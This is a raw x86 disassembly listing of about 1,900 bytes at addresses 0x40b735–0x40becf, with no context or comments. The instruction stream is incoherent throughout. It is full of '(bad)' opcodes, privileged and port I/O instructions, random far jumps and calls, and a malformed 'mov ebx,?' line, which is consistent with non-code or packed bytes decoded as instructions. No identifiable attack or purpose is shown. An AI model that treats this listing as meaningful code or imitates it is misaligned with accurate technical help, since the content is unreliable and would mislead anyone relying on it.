  40b735:	mov    ds:0x9a5f533a,eax
  40b73a:	sub    BYTE PTR ss:[ebp+0x3cba7a49],al
  40b741:	ffree  st(7)
  40b743:	inc    edi
  40b744:	(bad)  
  40b745:	data16 adc dl,dl
  40b748:	add    eax,0xf3370b48
  40b74d:	cli    
  40b74e:	jl     0x40b724
  40b750:	jo     0x40b6e8
  40b752:	mov    ecx,0x3ef933bf
  40b757:	mov    bh,BYTE PTR [ebx-0x11]
  40b75a:	push   esi
  40b75b:	test   eax,0xe3f17731
  40b760:	sub    DWORD PTR [esi+0x7f],edi
  40b763:	xchg   al,bl
  40b765:	mov    esp,0xf2e75243
  40b76a:	xchg   ecx,eax
  40b76b:	inc    bp
  40b76d:	xchg   esp,eax
  40b76e:	mov    dh,0x79
  40b770:	or     bh,BYTE PTR [ecx-0x45a52109]
  40b776:	(bad)  
  40b777:	push   ebx
  40b778:	push   edx
  40b779:	(bad)  
  40b77a:	lock add eax,0x80fd96eb
  40b780:	neg    BYTE PTR [edi]
  40b782:	push   edx
  40b783:	ins    BYTE PTR es:[edi],dx
  40b784:	shl    DWORD PTR ds:0x65fe516,cl
  40b78a:	sub    al,0x61
  40b78c:	popf   
  40b78d:	mov    dl,0xe8
  40b78f:	mov    edi,0x904dfb46
  40b794:	outs   dx,DWORD PTR ds:[esi]
  40b795:	mov    ecx,0xd97c433d
  40b79a:	test   DWORD PTR [eax+0x128f82ec],esi
  40b7a0:	mov    edx,0x4d5fe19f
  40b7a5:	xor    BYTE PTR [ecx],al
  40b7a7:	loopne 0x40b762
  40b7a9:	cmp    DWORD PTR ds:0x58b9eb08,edi
  40b7af:	test   al,0x56
  40b7b1:	mov    esi,0xfc2524db
  40b7b6:	call   0xcffd38bf
  40b7bb:	xchg   ebp,eax
  40b7bc:	fidivr DWORD PTR [esi+0x69]
  40b7bf:	(bad)  
  40b7c0:	mov    eax,0xcdf8a7cb
  40b7c5:	pop    esi
  40b7c6:	mov    ecx,0xcad80a0a
  40b7cb:	and    DWORD PTR [edi-0x259f1497],0xefbf4c6c
  40b7d5:	fisub  DWORD PTR [ebx+0x66b1eb56]
  40b7db:	imul   ebx,DWORD PTR [ebx+0x10],0x43
  40b7df:	inc    esp
  40b7e0:	bound  edx,QWORD PTR [eax+0x798527af]
  40b7e6:	jecxz  0x40b83c
  40b7e8:	jno    0x40b7f5
  40b7ea:	sbb    DWORD PTR ss:[ebx],edx
  40b7ed:	xchg   ebp,eax
  40b7ee:	dec    ebx
  40b7ef:	pusha  
  40b7f0:	bound  eax,QWORD PTR [edx+0x496dbc43]
  40b7f6:	mov    edi,0xa3ba2aa0
  40b7fb:	dec    ebx
  40b7fc:	adc    dl,BYTE PTR [esi+0x39]
  40b7ff:	and    esp,DWORD PTR es:[ecx+0x41]
  40b803:	xchg   esp,eax
  40b804:	rdtsc  
  40b806:	jb     0x40b7e6
  40b808:	js     0x5ddeb1b4
  40b80e:	and    DWORD PTR [esi+0x50f5c7ba],esi
  40b814:	xchg   ecx,eax
  40b815:	in     eax,dx
  40b816:	lods   al,BYTE PTR ds:[esi]
  40b817:	pusha  
  40b818:	xchg   BYTE PTR [edi-0x26],bh
  40b81b:	lock imul edi,DWORD PTR [edi+0xd4f5b0e],0x2f
  40b823:	scas   eax,DWORD PTR es:[edi]
  40b824:	mov    edx,0x472898d0
  40b829:	out    dx,al
  40b82a:	(bad)  
  40b82b:	scas   eax,DWORD PTR es:[edi]
  40b82c:	sub    DWORD PTR [ecx+0x29a14531],ebx
  40b832:	add    DWORD PTR [ecx+0x74],ebx
  40b835:	pop    edx
  40b836:	adc    BYTE PTR [edi-0x4f5d638],ch
  40b83c:	stos   BYTE PTR es:[edi],al
  40b83d:	aam    0xdd
  40b83f:	rcl    DWORD PTR [ebp+0x30e66d40],1
  40b845:	repz push esi
  40b847:	cmp    eax,0xf9b78eb6
  40b84c:	cmp    al,dl
  40b84e:	out    0xe6,eax
  40b850:	pop    edi
  40b851:	retf   
  40b852:	lods   eax,DWORD PTR ds:[esi]
  40b853:	xchg   esi,eax
  40b855:	adc    ebp,DWORD PTR [ebp+0x7da8b20b]
  40b85b:	xlat   BYTE PTR ds:[ebx]
  40b85c:	or     DWORD PTR [esi],ebp
  40b85e:	pop    esp
  40b85f:	mov    esp,0x8ffd1410
  40b864:	cmp    dh,BYTE PTR [edi]
  40b866:	push   es
  40b867:	in     eax,0xa5
  40b869:	jno    0x40b8a2
  40b86b:	inc    eax
  40b86c:	fs int3 
  40b86e:	pop    esi
  40b86f:	test   DWORD PTR [ecx],ebx
  40b871:	mov    edi,0xb62f983e
  40b876:	jmp    0x3f638b3a
  40b87b:	add    dl,BYTE PTR [eax]
  40b87d:	xchg   edi,eax
  40b87e:	or     edx,DWORD PTR [ebx+0x5a1e2c37]
  40b884:	imul   ecx,DWORD PTR [edx+0x70be9aab],0xffffff94
  40b88b:	or     al,0x4f
  40b88d:	mov    ebx,?
  40b88f:	stos   DWORD PTR es:[edi],eax
  40b890:	pop    edi
  40b891:	or     BYTE PTR [ebx-0x1a57f753],0x9
  40b898:	and    al,0x13
  40b89a:	fs loope 0x40b8a8
  40b89d:	jg     0x40b877
  40b89f:	and    al,0x39
  40b8a1:	push   eax
  40b8a2:	mov    al,ds:0xf1eb3309
  40b8a7:	adc    eax,0xe4f16a92
  40b8ac:	inc    esp
  40b8ad:	clc    
  40b8ae:	iret   
  40b8af:	mov    eax,0x24177083
  40b8b4:	ja     0x40b8e8
  40b8b6:	std    
  40b8b7:	leave  
  40b8b8:	ret    
  40b8b9:	mov    bh,0x79
  40b8bb:	mov    eax,0xd681a134
  40b8c0:	sub    al,0xd0
  40b8c2:	shl    DWORD PTR [esi],0xfe
  40b8c5:	push   ebp
  40b8c6:	push   ecx
  40b8c7:	je     0x40b871
  40b8c9:	xor    ch,dh
  40b8cb:	push   esp
  40b8cc:	jg     0x40b903
  40b8ce:	neg    DWORD PTR [edi+0x64]
  40b8d1:	inc    edx
  40b8d2:	jecxz  0x40b8a0
  40b8d4:	xchg   ecx,eax
  40b8d5:	xchg   ecx,eax
  40b8d6:	mov    cl,0xf3
  40b8d8:	in     eax,0x89
  40b8da:	je     0x40b942
  40b8dc:	adc    dl,ch
  40b8de:	jl     0x40b949
  40b8e0:	fnstenv [eax+esi*8+0x15cc48ed]
  40b8e7:	xchg   bl,cl
  40b8e9:	jg     0x40b902
  40b8eb:	dec    ebp
  40b8ec:	je     0x40b89e
  40b8ee:	inc    edx
  40b8ef:	test   eax,0x156a756c
  40b8f4:	ss pusha 
  40b8f6:	in     al,0xe0
  40b8f8:	clc    
  40b8f9:	xchg   edx,eax
  40b8fa:	jmp    0x90c8:0x8fd4147e
  40b901:	inc    eax
  40b902:	push   ebp
  40b903:	rol    DWORD PTR [ecx+0x19e82710],cl
  40b909:	cmp    DWORD PTR fs:[edi-0x43],ecx
  40b90d:	push   esi
  40b90e:	repz mov esi,0xe60254ad
  40b914:	clc    
  40b915:	push   esi
  40b916:	pop    ss
  40b917:	(bad)  
  40b918:	hlt    
  40b919:	fsub   QWORD PTR [esi-0x29]
  40b91c:	fisub  DWORD PTR [edi+edx*2-0x5d]
  40b920:	jg     0x40b950
  40b922:	sbb    ah,BYTE PTR [ebp-0x49]
  40b925:	add    BYTE PTR [eax-0x20],ch
  40b928:	pop    es
  40b929:	mov    edx,es
  40b92b:	into   
  40b92c:	(bad)  
  40b92d:	pop    edi
  40b92e:	xchg   DWORD PTR [esi+0x5d3699f],esp
  40b934:	ret    
  40b935:	mov    eax,ecx
  40b937:	loopne 0x40b91f
  40b939:	and    BYTE PTR [edi-0x6a],dl
  40b93c:	or     eax,0x68443243
  40b941:	xor    al,0xe0
  40b943:	and    eax,0xd130c2b8
  40b948:	push   es
  40b949:	adc    ch,BYTE PTR [ebx]
  40b94b:	pushf  
  40b94c:	test   DWORD PTR [eax+0x35],edi
  40b94f:	mov    bh,0xcb
  40b951:	mov    eax,0xa6d5957e
  40b956:	sub    ecx,DWORD PTR [edx-0x4f]
  40b959:	rcl    DWORD PTR es:[eax+edi*1],cl
  40b95d:	scas   al,BYTE PTR es:[edi]
  40b95e:	pop    esi
  40b95f:	cld    
  40b960:	idiv   DWORD PTR [ecx+esi*4-0x73]
  40b964:	dec    ebp
  40b965:	mov    esp,0xb8dc61f6
  40b96a:	fdivr  QWORD PTR [ebp-0x8]
  40b96d:	xor    BYTE PTR [edi+0x44be26ba],dh
  40b973:	jns    0x40b94e
  40b975:	jecxz  0x40b90c
  40b977:	cwde   
  40b978:	imul   esp,DWORD PTR [esi+0x592e07e1],0xd950519c
  40b982:	pop    ds
  40b983:	mov    ds:0xb90d343c,al
  40b988:	sub    BYTE PTR [ebx+0x6a],bh
  40b98b:	popa   
  40b98c:	cmp    BYTE PTR [edi],bl
  40b98e:	call   0x1bfb8b40
  40b993:	cmp    BYTE PTR [ebp+0x2e],0x88
  40b997:	outs   dx,DWORD PTR ds:[esi]
  40b998:	(bad)  
  40b999:	les    ebx,FWORD PTR [esi+0x30ee5859]
  40b99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a0:	adc    al,0xcb
  40b9a2:	das    
  40b9a3:	ret    0xa2a0
  40b9a6:	(bad)  
  40b9a7:	int3   
  40b9a8:	mov    ds:0x45ca394,eax
  40b9ad:	fs jmp 0xb9f0:0xb5c8f71
  40b9b5:	sbb    bl,BYTE PTR [ebx]
  40b9b7:	jns    0x40b98a
  40b9b9:	mov    ds:0x219d85be,eax
  40b9be:	call   0xd9dc:0x45fbaada
  40b9c5:	ins    DWORD PTR es:[edi],dx
  40b9c6:	xchg   ebp,eax
  40b9c7:	push   esi
  40b9c8:	popa   
  40b9c9:	pop    ss
  40b9ca:	mov    cl,bl
  40b9cc:	ins    BYTE PTR es:[edi],dx
  40b9cd:	sub    DWORD PTR [esp+edi*1],0x9a7fcd9c
  40b9d4:	push   esp
  40b9d5:	mov    edx,0xbb111f92
  40b9da:	push   ds
  40b9db:	add    eax,DWORD PTR [edi-0x56]
  40b9de:	lods   al,BYTE PTR ds:[esi]
  40b9df:	dec    ecx
  40b9e0:	out    0xee,al
  40b9e2:	push   ebp
  40b9e3:	mov    ds:0x70e72532,eax
  40b9e8:	mov    ds:0xe00251ea,eax
  40b9ed:	shl    cl,1
  40b9ef:	sbb    eax,0xad266ae
  40b9f4:	xor    eax,0x82b79898
  40b9f9:	mov    BYTE PTR [edx],bh
  40b9fb:	lods   eax,DWORD PTR ds:[esi]
  40b9fc:	imul   ecx,ebp,0x84e589f7
  40ba02:	and    al,0xf3
  40ba04:	imul   ecx,esi,0x98eeb478
  40ba0a:	push   0xa00d64a2
  40ba0f:	push   eax
  40ba10:	in     eax,dx
  40ba11:	mov    dl,BYTE PTR [ecx]
  40ba13:	(bad)  
  40ba14:	jg     0x40ba16
  40ba16:	cmp    DWORD PTR [esp+ebp*8-0x6257cbd5],eax
  40ba1d:	mov    al,ds:0x62553416
  40ba22:	push   esp
  40ba23:	cmp    eax,0xc7167b78
  40ba28:	jne    0x40b9e7
  40ba2a:	adc    al,0x1a
  40ba2c:	out    dx,al
  40ba2d:	das    
  40ba2e:	add    ebp,DWORD PTR [esi+0x1c]
  40ba31:	jmp    0xd2cfd443
  40ba36:	mov    es,WORD PTR [esi+0x4c]
  40ba39:	mov    cl,0x3f
  40ba3b:	sbb    eax,0xf9d3b5be
  40ba40:	loopne 0x40ba56
  40ba42:	stc    
  40ba43:	adc    edx,eax
  40ba45:	call   0x607a:0x8946229f
  40ba4c:	jne    0x40ba25
  40ba4e:	out    dx,al
  40ba4f:	daa    
  40ba50:	xor    ch,0xb7
  40ba53:	repz jmp 0x206b845b
  40ba59:	fsub   DWORD PTR ds:0xdd1b140b
  40ba5f:	ins    DWORD PTR es:[edi],dx
  40ba60:	pop    ecx
  40ba61:	int    0x55
  40ba63:	and    eax,0x7ea507c3
  40ba68:	pop    esi
  40ba69:	(bad)  
  40ba6a:	jnp    0x40babc
  40ba6c:	test   eax,0xf8561d68
  40ba71:	sbb    ah,ah
  40ba73:	test   eax,0x28179aa1
  40ba78:	dec    esi
  40ba79:	mov    dh,0x2d
  40ba7b:	or     eax,0x8739dbd6
  40ba80:	dec    eax
  40ba81:	xchg   esp,eax
  40ba82:	cwde   
  40ba83:	stos   DWORD PTR es:[edi],eax
  40ba84:	mov    ah,0xb3
  40ba86:	dec    ebx
  40ba87:	(bad)  
  40ba88:	or     eax,0x23c9412b
  40ba8d:	sub    bl,dl
  40ba8f:	not    DWORD PTR [edi-0x49056c19]
  40ba95:	(bad)  
  40ba96:	pop    edx
  40ba97:	popf   
  40ba98:	add    esi,DWORD PTR [ebp+ebx*2+0x483ca42c]
  40ba9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baa0:	xchg   esp,eax
  40baa1:	sub    dl,BYTE PTR [eax]
  40baa3:	pop    ecx
  40baa4:	inc    esi
  40baa5:	into   
  40baa6:	or     al,0xd8
  40baa8:	adc    bl,BYTE PTR [edx]
  40baaa:	ja     0x40bb18
  40baac:	jo     0x40ba97
  40baae:	push   edx
  40baaf:	jns    0x40ba81
  40bab1:	push   ecx
  40bab2:	jbe    0x40ba7d
  40bab4:	mov    ebx,0x829af044
  40bab9:	add    ch,BYTE PTR [ecx+0x6fdc6fa2]
  40babf:	and    dh,BYTE PTR [eax-0x421ef3e6]
  40bac5:	ja     0x40bac0
  40bac7:	das    
  40bac8:	call   FWORD PTR [edx-0x26b572c2]
  40bace:	jg     0x40ba50
  40bad0:	jle    0x40bb13
  40bad2:	mov    bh,cl
  40bad4:	aas    
  40bad5:	pop    ebx
  40bad6:	mov    dl,0xd1
  40bad8:	in     al,0xfb
  40bada:	cdq    
  40badb:	cmp    BYTE PTR [ebx+ebp*2-0x51],bh
  40badf:	je     0x40badf
  40bae1:	push   ebp
  40bae2:	icebp  
  40bae3:	xor    al,0x24
  40bae5:	ret    0x771e
  40bae8:	mov    esp,0x1512695e
  40baed:	push   edx
  40baee:	or     DWORD PTR [ebx+edi*2],ebx
  40baf1:	xor    DWORD PTR [ecx+0x7ad46851],0xffffffd0
  40baf8:	scas   eax,DWORD PTR es:[edi]
  40baf9:	aam    0x70
  40bafb:	lods   al,BYTE PTR ds:[esi]
  40bafc:	xchg   DWORD PTR [ecx+esi*4-0x65],esp
  40bb00:	stos   DWORD PTR es:[edi],eax
  40bb01:	cmp    DWORD PTR [ebx+0x4],ebp
  40bb04:	jmp    0xbbfd73e5
  40bb09:	dec    edi
  40bb0a:	mov    ch,BYTE PTR [edx]
  40bb0c:	(bad)  
  40bb0d:	push   esi
  40bb0e:	mov    ebp,0xdff9d377
  40bb13:	pop    ebp
  40bb14:	stos   DWORD PTR es:[edi],eax
  40bb15:	mov    DWORD PTR [esi],edi
  40bb17:	jmp    0x4ba1:0x989ecea1
  40bb1e:	xor    eax,0xc1101ca1
  40bb23:	sub    dl,BYTE PTR [edi-0x5b24eb0c]
  40bb29:	pop    ds
  40bb2a:	sub    al,BYTE PTR [ecx-0x28b567e0]
  40bb30:	mov    al,0x89
  40bb32:	outs   dx,DWORD PTR ds:[esi]
  40bb33:	jb     0x40bb25
  40bb35:	stos   BYTE PTR es:[edi],al
  40bb36:	cmp    dl,al
  40bb38:	cwde   
  40bb39:	push   ebx
  40bb3a:	(bad)  
  40bb3b:	hlt    
  40bb3c:	int3   
  40bb3d:	lods   al,BYTE PTR ds:[esi]
  40bb3e:	scas   al,BYTE PTR es:[edi]
  40bb3f:	ror    dl,0x3e
  40bb42:	repz mov eax,ds:0xc4ec74f5
  40bb48:	aam    0x3e
  40bb4a:	sbb    al,0xfb
  40bb4c:	or     DWORD PTR [ebx-0x6b],ebx
  40bb4f:	inc    ebx
  40bb50:	and    esi,DWORD PTR [edi-0x44]
  40bb53:	adc    BYTE PTR [esi+0x79434fc5],0x68
  40bb5a:	in     eax,dx
  40bb5b:	push   ss
  40bb5c:	inc    esp
  40bb5d:	xchg   esi,eax
  40bb5e:	sti    
  40bb5f:	in     eax,dx
  40bb60:	jns    0x40baec
  40bb62:	call   DWORD PTR gs:[ecx-0x6d165e90]
  40bb69:	sti    
  40bb6a:	push   ss
  40bb6b:	ds retf 0xa15d
  40bb6f:	ja     0x40bb38
  40bb71:	fs or  eax,0x8391087e
  40bb77:	mov    edx,0x90acc881
  40bb7c:	push   ss
  40bb7d:	adc    eax,0xae54778f
  40bb82:	pop    ebx
  40bb83:	(bad)
  40bb86:	outs   dx,DWORD PTR ds:[esi]
  40bb87:	mov    ds:0x35b75210,al
  40bb8c:	push   ebx
  40bb8d:	les    eax,FWORD PTR [esi+0x2b]
  40bb90:	add    edi,DWORD PTR [esi+0x5beb045d]
  40bb96:	jg     0x40bb85
  40bb98:	out    0x60,al
  40bb9a:	fist   DWORD PTR [ebx]
  40bb9c:	jo     0x40bbd5
  40bb9e:	xor    ebx,edx
  40bba0:	call   0x6f15ae43
  40bba5:	adc    BYTE PTR [edi+0x4e310b64],ah
  40bbab:	dec    ebx
  40bbac:	jle    0x40bb9a
  40bbae:	mov    esp,0x48876a04
  40bbb3:	jne    0x40bbe7
  40bbb5:	xchg   DWORD PTR [ecx],ebx
  40bbb7:	imul   esi,ebx,0xffffffcd
  40bbba:	jp     0x40bbb1
  40bbbc:	ja     0x40bbb8
  40bbbe:	ss jnp 0x40bb56
  40bbc1:	adc    BYTE PTR [eax+0x1dac377f],0x41
  40bbc8:	cmp    dh,BYTE PTR [ecx-0x12]
  40bbcb:	enter  0xb139,0xb3
  40bbcf:	stos   BYTE PTR es:[edi],al
  40bbd0:	les    ebp,FWORD PTR [edx]
  40bbd2:	mov    dl,BYTE PTR [ecx-0x20]
  40bbd5:	xlat   BYTE PTR ds:[ebx]
  40bbd6:	xchg   ebx,ecx
  40bbd8:	sub    bh,ah
  40bbda:	ret    
  40bbdb:	inc    ebp
  40bbdc:	(bad)  
  40bbdd:	aas    
  40bbde:	or     ecx,DWORD PTR [edx-0x78]
  40bbe1:	cmc    
  40bbe2:	sbb    DWORD PTR [ebx+edx*4-0x217cc546],ecx
  40bbe9:	call   0x23eb:0x21e440a1
  40bbf0:	mov    esi,0xf91f58d1
  40bbf5:	cmp    al,0x33
  40bbf7:	and    eax,0x232541dc
  40bbfc:	pop    eax
  40bbfd:	mov    ds:0x9a8d6f47,eax
  40bc02:	fnstcw WORD PTR [esi-0x304588db]
  40bc08:	dec    edi
  40bc09:	out    0xb8,eax
  40bc0b:	out    dx,eax
  40bc0c:	cmp    DWORD PTR [edi],ebp
  40bc0e:	call   0x5619:0xa0fdee63
  40bc15:	jnp    0x40bba4
  40bc17:	pop    eax
  40bc18:	mov    cl,0x2d
  40bc1a:	icebp  
  40bc1b:	fidiv  DWORD PTR [ecx+0x7]
  40bc1e:	adc    eax,0xbcdeae6c
  40bc23:	xchg   ebx,eax
  40bc24:	mov    al,0x98
  40bc26:	outs   dx,DWORD PTR ds:[esi]
  40bc27:	cwde   
  40bc28:	stc    
  40bc29:	mov    ebp,ecx
  40bc2b:	xchg   ecx,eax
  40bc2c:	inc    ebx
  40bc2d:	xlat   BYTE PTR ds:[ebx]
  40bc2e:	add    eax,0x661cf31a
  40bc33:	leave  
  40bc34:	aad    0x3e
  40bc36:	sub    al,0x99
  40bc38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc39:	bound  edi,QWORD PTR [eax-0xe]
  40bc3c:	les    esi,FWORD PTR [ebx+ecx*8-0x29]
  40bc40:	cmp    ah,BYTE PTR [ebp+0x1ce6ecd1]
  40bc46:	test   BYTE PTR [edx],0x76
  40bc49:	push   esp
  40bc4a:	sahf   
  40bc4b:	lock icebp 
  40bc4d:	cli    
  40bc4e:	inc    edx
  40bc4f:	mov    ecx,0xac113358
  40bc54:	and    ecx,esp
  40bc56:	pop    eax
  40bc57:	add    dl,al
  40bc59:	pop    es
  40bc5a:	out    0x72,eax
  40bc5c:	adc    ebx,0xc07b41ed
  40bc62:	pop    ebx
  40bc63:	mov    DWORD PTR [eax],ebx
  40bc65:	test   BYTE PTR [ebx+0x7553ee5],0x4e
  40bc6c:	xor    eax,0xb6911344
  40bc71:	aad    0x56
  40bc73:	sub    al,BYTE PTR [esp+ebx*2-0x48df98ef]
  40bc7a:	les    esp,FWORD PTR [eax-0x56a2876a]
  40bc80:	out    0x55,eax
  40bc82:	push   eax
  40bc83:	xchg   edi,eax
  40bc84:	pushf  
  40bc85:	lds    edi,FWORD PTR [eax-0x5aa2377e]
  40bc8b:	mov    al,ds:0xc6f150c5
  40bc90:	mov    eax,ds:0x310b1b68
  40bc95:	jno    0x40bc39
  40bc97:	mov    bl,0xa3
  40bc99:	fstp   DWORD PTR [esi+0x60651719]
  40bc9f:	imul   edi,DWORD PTR [edi-0x681715a0],0xfffffffb
  40bca6:	test   eax,0xba6d3001
  40bcab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcac:	scas   eax,DWORD PTR es:[edi]
  40bcad:	mov    cl,0x18
  40bcaf:	jge    0x40bcec
  40bcb1:	xchg   ebx,eax
  40bcb2:	arpl   WORD PTR [edi+esi*4],sp
  40bcb5:	dec    esp
  40bcb6:	or     edx,DWORD PTR [edx]
  40bcb8:	test   eax,0xb3824684
  40bcbd:	cdq    
  40bcbe:	retf   0xd7f0
  40bcc1:	sub    bh,BYTE PTR [ebp+0x3154ba7f]
  40bcc7:	add    esi,DWORD PTR [esi+0x756bfcf2]
  40bccd:	dec    esi
  40bcce:	push   ebx
  40bccf:	xor    ebx,DWORD PTR [esi]
  40bcd1:	call   0xe5d0ef85
  40bcd6:	dec    esi
  40bcd7:	xchg   edx,eax
  40bcd8:	aam    0x35
  40bcda:	call   0x9965:0xdd11e060
  40bce1:	addr16 in al,dx
  40bce3:	push   ss
  40bce4:	arpl   WORD PTR [ebx-0x26],dx
  40bce7:	leave  
  40bce8:	and    edx,DWORD PTR [edx]
  40bcea:	sbb    DWORD PTR [ecx],ebp
  40bcec:	scas   al,BYTE PTR es:[edi]
  40bced:	xchg   ecx,eax
  40bcee:	add    BYTE PTR [ebp-0x8],cl
  40bcf1:	jb     0x40bce1
  40bcf3:	ins    BYTE PTR es:[edi],dx
  40bcf4:	mov    ds:0x40913a05,eax
  40bcf9:	mov    ebx,0xdb2c2be2
  40bcfe:	jae    0x40bd7e
  40bd00:	jnp    0x40bd77
  40bd02:	jmp    0xf756aed5
  40bd07:	stos   DWORD PTR es:[edi],eax
  40bd08:	dec    eax
  40bd09:	dec    edx
  40bd0a:	in     eax,dx
  40bd0b:	pop    ebp
  40bd0c:	sub    ebx,eax
  40bd0e:	sub    DWORD PTR [eax-0x37],edi
  40bd11:	mov    esi,0xe9c7b3ba
  40bd16:	xor    eax,0x3268d5da
  40bd1b:	mov    eax,ds:0xe408a309
  40bd20:	and    DWORD PTR [esi-0x38266dbe],esi
  40bd26:	add    DWORD PTR [edx-0x7a9dddf4],0x168780cb
  40bd30:	(bad)  
  40bd31:	or     eax,0x87c66bed
  40bd36:	(bad)  
  40bd37:	(bad)  
  40bd39:	out    dx,al
  40bd3a:	mov    BYTE PTR [edi-0x60822ea9],dl
  40bd40:	mov    ch,0x70
  40bd42:	adc    ebx,DWORD PTR [ebx+0x2df4a94f]
  40bd48:	dec    ebx
  40bd49:	(bad)  
  40bd4a:	fs mov al,0x7
  40bd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4e:	jnp    0x40bd3f
  40bd50:	inc    ebp
  40bd51:	jne    0x40bd89
  40bd53:	int3   
  40bd54:	inc    ecx
  40bd55:	mov    bl,BYTE PTR [ebx]
  40bd57:	inc    ebp
  40bd58:	fdivr  st,st(6)
  40bd5a:	mov    bh,0xe2
  40bd5c:	out    dx,al
  40bd5d:	push   0xffffffe9
  40bd5f:	dec    eax
  40bd60:	mov    edi,0xed37818a
  40bd65:	mov    esi,0x72b44b66
  40bd6a:	inc    esi
  40bd6b:	sub    bh,ah
  40bd6d:	push   ss
  40bd6e:	cmp    al,0xb3
  40bd70:	nop
  40bd71:	enter  0x2293,0x8c
  40bd75:	sbb    eax,0x13264982
  40bd7a:	jecxz  0x40bd3d
  40bd7c:	ror    DWORD PTR [esi],cl
  40bd7e:	xchg   ebp,eax
  40bd7f:	pop    ss
  40bd80:	pusha  
  40bd81:	sub    esp,DWORD PTR [ebp+0x5a47a819]
  40bd87:	outs   dx,DWORD PTR ds:[esi]
  40bd88:	mov    dl,ah
  40bd8a:	pop    edi
  40bd8b:	lea    edi,[ecx+ecx*4]
  40bd8e:	pop    ebx
  40bd8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd90:	imul   ecx,DWORD PTR [ebp+ecx*1-0x73],0xf6b104ca
  40bd98:	lahf   
  40bd99:	mov    al,ds:0xce61639
  40bd9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd9f:	inc    esp
  40bda0:	jo     0x40bd74
  40bda2:	xor    al,0x67
  40bda4:	xchg   BYTE PTR [ebp-0x5b66f904],dh
  40bdaa:	cmp    al,0xad
  40bdac:	xor    al,cl
  40bdae:	adc    DWORD PTR [eax+0x18],0xffffffd2
  40bdb2:	test   al,0xcc
  40bdb4:	ret    0xc66
  40bdb7:	xchg   ebx,eax
  40bdb8:	mov    ds:0xd8067dfc,eax
  40bdbd:	cmc    
  40bdbe:	jno    0x40bdb1
  40bdc0:	ret    0xad81
  40bdc3:	dec    esp
  40bdc4:	ins    DWORD PTR es:[edi],dx
  40bdc5:	xor    eax,0xc7f9641c
  40bdca:	cmp    al,0x81
  40bdcc:	jne    0x40bdec
  40bdce:	push   esp
  40bdcf:	lahf   
  40bdd0:	test   BYTE PTR [edx-0x33cea663],cl
  40bdd6:	mov    eax,ds:0x3a57c8a8
  40bddb:	lods   al,BYTE PTR ds:[esi]
  40bddc:	lea    ebx,[ebp-0xa82aed]
  40bde2:	add    al,bh
  40bde4:	int3   
  40bde5:	jmp    0x40be5d
  40bde7:	les    esi,FWORD PTR [edx+ebp*8-0x73]
  40bdeb:	cdq    
  40bdec:	inc    ecx
  40bded:	push   ebp
  40bdee:	pop    ebx
  40bdef:	data16 aas 
  40bdf1:	xchg   ecx,eax
  40bdf2:	mov    bl,0x86
  40bdf4:	(bad)  
  40bdf5:	fstp   QWORD PTR [ebx+0x6]
  40bdf8:	outs   dx,DWORD PTR ds:[esi]
  40bdf9:	inc    edx
  40bdfa:	call   0x81f54547
  40bdff:	sub    BYTE PTR [ebx-0x24bcfc0f],dl
  40be05:	popf   
  40be06:	mov    eax,ds:0xaa2a98a
  40be0b:	fstp   DWORD PTR [eax-0x66]
  40be0e:	xor    cl,BYTE PTR [edx-0x6d]
  40be11:	ins    DWORD PTR es:[edi],dx
  40be12:	test   eax,0x493b7a64
  40be17:	inc    esi
  40be18:	mov    al,ds:0xba556abb
  40be1d:	xchg   edi,eax
  40be1e:	xchg   edi,eax
  40be1f:	adc    DWORD PTR [eax],0x4a09d15b
  40be25:	lds    esi,FWORD PTR [edx]
  40be27:	push   es
  40be28:	and    dl,dh
  40be2a:	sti    
  40be2b:	xchg   ebx,eax
  40be2c:	(bad)  [ecx+esi*1-0x4dbe15fe]
  40be33:	ins    DWORD PTR es:[edi],dx
  40be34:	pop    eax
  40be35:	imul   edx,DWORD PTR [esi-0x55a70166],0x65657028
  40be3f:	dec    eax
  40be40:	or     esp,DWORD PTR [ebx+0x7e]
  40be43:	outs   dx,DWORD PTR ds:[esi]
  40be44:	sbb    edi,DWORD PTR [esp+ecx*2+0x566b1da3]
  40be4b:	or     edi,DWORD PTR [eax-0xfa2fd1c]
  40be51:	(bad)  
  40be52:	inc    ecx
  40be53:	pop    edx
  40be54:	mov    BYTE PTR [ecx+ebx*2-0x5],bl
  40be58:	in     al,dx
  40be59:	jmp    0x91b3d124
  40be5e:	adc    al,al
  40be60:	inc    eax
  40be61:	clc    
  40be62:	jno    0x40be9f
  40be64:	push   es
  40be65:	addr16 pop ebx
  40be67:	push   0x1a2fde44
  40be6c:	mov    esi,0x1e094c3d
  40be71:	cmc    
  40be72:	data16 mov al,0x71
  40be75:	fimul  DWORD PTR [edi+ebx*1-0x2dd14bd5]
  40be7c:	ss ins BYTE PTR es:[edi],dx
  40be7e:	sbb    eax,0xd51d286a
  40be83:	mov    dl,0x2a
  40be85:	push   es
  40be86:	das    
  40be87:	and    ah,BYTE PTR [eax-0x3c]
  40be8a:	out    0x27,eax
  40be8c:	xchg   ebx,eax
  40be8d:	mov    edx,0x5d40519b
  40be92:	das    
  40be93:	pop    ds
  40be94:	cmp    al,bl
  40be96:	lods   eax,DWORD PTR ds:[esi]
  40be97:	lds    ebx,FWORD PTR [esi]
  40be99:	hlt    
  40be9a:	cmp    ecx,DWORD PTR [esi]
  40be9c:	imul   edx,DWORD PTR [ecx],0xffffffdc
  40be9f:	fdiv   DWORD PTR [ecx+0x3b9be1c3]
  40bea5:	rcr    esp,0x3a
  40bea8:	cmp    bl,BYTE PTR [edx+esi*2+0x70]
  40beac:	les    ebx,FWORD PTR [esi]
  40beae:	cs inc ecx
  40beb0:	mov    BYTE PTR ds:0xffccd4e6,bl
  40beb6:	pusha  
  40beb7:	sub    edx,DWORD PTR ds:0x58027c31
  40bebd:	hlt    
  40bebe:	push   esp
  40bebf:	in     al,dx
  40bec0:	and    BYTE PTR [ebx],dh
  40bec2:	xor    ch,BYTE PTR [eax+0x6d]
  40bec5:	aas    
  40bec6:	loope  0x40be71
  40bec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec9:	stos   DWORD PTR es:[edi],eax
  40beca:	ret    
  40becb:	jo     0x40bf28
  40becd:	push   edi
  40bece:	push   edx
  40becf:	push   0x57
